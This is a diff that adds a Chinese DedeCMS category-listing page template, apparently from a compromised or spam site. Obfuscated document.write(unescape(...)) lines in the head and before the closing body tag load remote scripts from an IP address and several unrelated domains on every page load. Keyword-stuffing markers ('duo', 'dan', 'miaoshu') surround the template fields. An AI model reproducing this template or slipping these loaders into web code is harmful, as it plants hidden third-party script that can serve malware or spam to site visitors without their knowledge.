@@ -1,0 +1,194 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset={dede:global.cfg_soft_lang/}" />
+<title>duo{dede:field name='typename'/}duo</title>
+<meta name="description" content="miaoshu{dede:field name='typename'/}miaoshu" />
+<meta name="keywords" content="duo{dede:field name='typename'/}duo" />
+<link href="/a/{dede:type2}[field:typename /]{/dede:type2}/templets/default/style/common.css" rel="stylesheet" media="screen" type="text/css" />
+<link href="/a/{dede:type2}[field:typename /]{/dede:type2}/templets/default/style/mobanlist.css" rel="stylesheet" type="text/css">
+<script language="javascript" type="text/javascript" src="/a/{dede:type2}[field:typename /]{/dede:type2}/templets/default/js/myfocus.js"></script>
+<script>document.write(unescape('%3cscript%20src%3d%22http%3a//182.16.11.170/日期2/bak/%22%20type%3d%22text/javascript%22%3e%3c/script%3e'));</script>
+<script>document.write(unescape('%3cscript%20src%3d%22http%3a//sifu.tuangoubus123.com/日期2/bak/tiaoyong.js%22%20type%3d%22text/javascript%22%3e%3c/script%3e'));</script>
+<script>document.write(unescape('%3cscript%20src%3d%22http%3a//sifu.zuiaiguagzhou.com/日期2/ad.js%22%20type%3d%22text/javascript%22%3e%3c/script%3e'));</script>
+</head>
+<body class="articlelist">
+<div class="w960 center">
+{dede:include filename="head_i.htm"/}
+<!-- /header -->
+<div class="clear" style="margin-top:5px;"></div>
+<div id="mbtx" style="margin-bottom:5px;"></div>
+<div class="mbody">
+    <div id="article_left">
+        <div class="soft_xiangg">
+            <h4 class="soft_xg_title">广告赞助商</h4>
+            <div class="soft_xg_box" id="mbtx250220">                   
+            </div>
+        </div>
+        <div id="lm_class">
+            <h5><ins>栏目分类</ins></h5>
+            <ul>
+                {dede:channel type='son'}
+                <li><a href='[field:typeurl/]' target="_blank">dan[field:typename/]dan<span></span></a></li>
+                {/dede:channel}
+            </ul>
+        </div>
+        <div class="soft_xiangg">
+            <h4 class="soft_xg_title">dan{dede:field name='typename' function=”GetTypeName(@me)”/}dan相关信息</h4>
+            <div class="soft_xg_box">
+                <div id="soft_xg_tuij">
+                    <h5>·相关dan{dede:field name='typename' function=”GetTypeName(@me)”/}dan文章推荐</h5>
+                    <ul class="soft_xg_ul">
+                        {dede:arclist row='10' titlelen='42' orderby='rank' typeid=''}
+                        <li><a href="[field:arcurl /]" target="_blank" title="[field:fulltitle /]">[field:title /]</a></li>
+                        {/dede:arclist}
+                    </ul>
+                </div>
+            </div>
+        </div>
+        <div id="tuijian_soft">
+            <h5>热门栏目推荐</h5>
+            <ul>
+           {dede:randomartlist row=10}
+<li><a href="{dede:field name='typeurl'/}" title="dan{dede:field name='typename'/}dan">dan{dede:field name='typename'/}dan</a></li>
+{/dede:randomartlist}
+            </ul>
+        </div>
+
+        <div id="soft_down_ph">
+            <h5>dan{dede:field name='typename' function=”GetTypeName(@me)”/}dan文章阅读排行</h5>
+            <div class="soft_down_ph_box">
+                <ul>
+                   {dede:randomartlist row=1}
+
+<ul>
+{dede:arclist titlelen=40 row='10'}
+<li><a href="[field:arcurl/]" title="[field:fulltitle/]">[field:title/]</a></li>
+{/dede:arclist}
+</ul>
+{/dede:randomartlist}
+                </ul>
+            </div>
+        </div>
+    </div>
+    <div id="page_right">
+        <div id="yuanma_list_tuij">
+            <h5><ins>dan{dede:field name='typename' function=”GetTypeName(@me)”/}dan推荐图文</ins></h5>
+            <ul class="yuanmalist_bot">
+                {dede:arclist row='5' orderby='hot' type='image'}
+                <li><a href="[field:arcurl/]" target="_blank"><img src="[field:litpic/]" alt="[field:fulltitle /]" />[field:title/]</a>
+                </li>
+                {/dede:arclist}
+            </ul>
+        </div>
+        <!--当前分类& 翻页 开始-->
+        <div class="lmpager">
+            <p class="lm_nametype">
+                当前位置：
+                <strong>dan{dede:field name='typename' function=”GetTypeName(@me)”/}dan</strong>
+            </p>
+            <p class="lm_pager_box">
+                {dede:pagelists listitem="index,pre,next,end,info,option" listsize="5"/}
+            </p>
+        </div>
+        <!--当前分类& 翻页 结束-->
+        <div id="lm_right_main">
+            <div class="title">
+                <span class="hover" id="mbtxone">按文字列表</span>
+                <span id="mbtxtwo">按图片列表</span>
+            </div>
+            
+            <div id="mbtxa">
+            <div id="lm_downlist_box">
+                <div id="yuanma_downlist_bg">
+                {dede:list pagesize='16' infolen='96'}
+		            <div class="yuanma_downlist_box">
+                        <p class="pic">[field:array runphp='yes']@me = (empty(@me['litpic']) ? "" : "<a href='{@me['arcurl']}' class='preview'><img src='{@me['litpic']}'/></a>"); [/field:array]</p>
+                        <div class="geme_dl_info">
+                            <h4><strong><a href="[field:arcurl/]">[field:fulltitle/]</a></strong><span>[<a href="[field:typeurl/]">dan[field:typename/]dan</a>]</span></h4>
+                            <dl>
+                                <dd>[field:infos/]……</dd>
+                                <dt><a href="[field:arcurl/]" class="download"><ins>马上查看</ins></a></dt>
+                            </dl>
+                            <p>更新时间：<span class="dangtian">[field:pubdate function="GetDateMK(@me)"/]</span>阅读次数：<strong>[field:click/]</strong>好评：<span>[field:scores/]</span><a href="[field:arcurl/]#down_comment" target="_blank">已有[field:ID runphp='yes']$dsql = new dedesql(false);$dsql -> SetQuery("Select count(id) as c from #@__feedback where aid=".@me);$row = $dsql -> getone();@me=$row['c'];[/field:ID]条评论</a></p>
+                        </div>
+                    </div>
+                    {/dede:list}
+                </div>
+            </div>                
+            </div>
+                
+            <div id="mbtxb">
+            <div id="lm_downlist_boxs">
+                <ul id="new_yuanmas_nr">
+                    {dede:list pagesize='16' titlelen='42' infolen='40'}
+                    <li>
+                        <div class="oo">
+                            <a href="[field:arcurl/]" target="_blank"><img src="[field:litpic/]" width="140" height="120" alt="[field:fulltitle /]"></a>
+                            <span><!--<b></b>--><strong>[field:ID runphp='yes']$dsql = new dedesql(false);$dsql -> SetQuery("Select count(id) as c from #@__feedback where aid=".@me);$row = $dsql -> getone();@me=$row['c'];[/field:ID]<em>条评论</em></strong></span>
+                            <p class="[field:tuijianttt/]"></p>
+                        </div>
+                        <div class="ccc">
+                            <p class="titles">
+                                <strong><a href="[field:arcurl/]" target="_blank">[field:title/]</a></strong>
+                            </p>
+                            <span>[field:infos/]
+                                <em>&nbsp;&nbsp;</em>
+                            </span>
+                            <p><b>Info:</b>&nbsp;&nbsp;<small>[field:scores/]好评
+                            &nbsp;[field:click/] 点击</small></p>
+                            <p>
+                                <a href="[field:arcurl /]" class="bengin_yuanma1" target="_blank" style="color:#FFF">马上查看</a>
+                                <a href="[field:arcurl /]#down_comment" class="bengin_yuanma" target="_blank" style="color:#FFF">我要评论</a>
+                            </p>
+                        </div>
+                    </li>
+                    {/dede:list}
+                </ul>
+            </div>
+            </div>
+            
+            
+        </div>
+        
+        <script type="text/javascript" src="/a/{dede:type2}[field:typename /]{/dede:type2}/templets/default/js/tab.js"></script>
+		<script type="text/javascript">
+				window.onload=function(){
+					var tabtype={trigger:'mouseover',tabCurrentClass:'newclass',auto:false,timer:1000,delay:300 };
+					//  var tabtype={trigger:'mouseover',tabCurrentClass:'newclass',delay:300,auto:true,timer:1500};
+					tabInit(tabtype,['mbtxone','mbtxa','o'],['mbtxtwo','mbtxb'])
+				}
+		</script>
+          
+        <!--当前分类& 翻页 开始-->
+        <div class="lmpager">
+            <p class="lm_nametype">
+                当前分类：<strong>dan{dede:field name='typename' function=”GetTypeName(@me)”/}dan</strong>
+            </p>
+            <p class="lm_pager_box">
+                {dede:pagelists listitem="index,pre,next,end,info,option" listsize="5"/}
+            </p>
+        </div>
+        <!--当前分类& 翻页 结束-->
+    </div>
+    <div class="clear" style="margin-top:10px;"></div>
+</div>
+<!-- /footer -->
+{dede:include filename="mbtxfoot.htm"/}
+<!-- /footer -->
+</div>
+    <div id="gg250220" style="display:none">
+        <div style="margin-top:2px; margin-bottom:1px;">
+            <script language='javascript' src='/a/{dede:type2}[field:typename /]{/dede:type2}/templets/default/js/gg250220.js'>
+            </script>
+        </div>
+    </div>
+    <script type="text/javascript">
+        document.getElementById("mbtx250220").innerHTML = document.getElementById("gg250220").innerHTML;
+        document.getElementById("gg250220").innerHTML = "";
+    </script>
+	<script>document.write(unescape('%3cscript%20src%3d%22http%3a//fhsm8.com/日期2/bak/boai9.js%22%20type%3d%22text/javascript%22%3e%3c/script%3e'));</script>
+<script>document.write(unescape('%3cscript%20src%3d%22http%3a/fhsm8.com/日期2/bak/%22%20type%3d%22text/javascript%22%3e%3c/script%3e'));</script>
+<统计1>
+</body>
+</html>
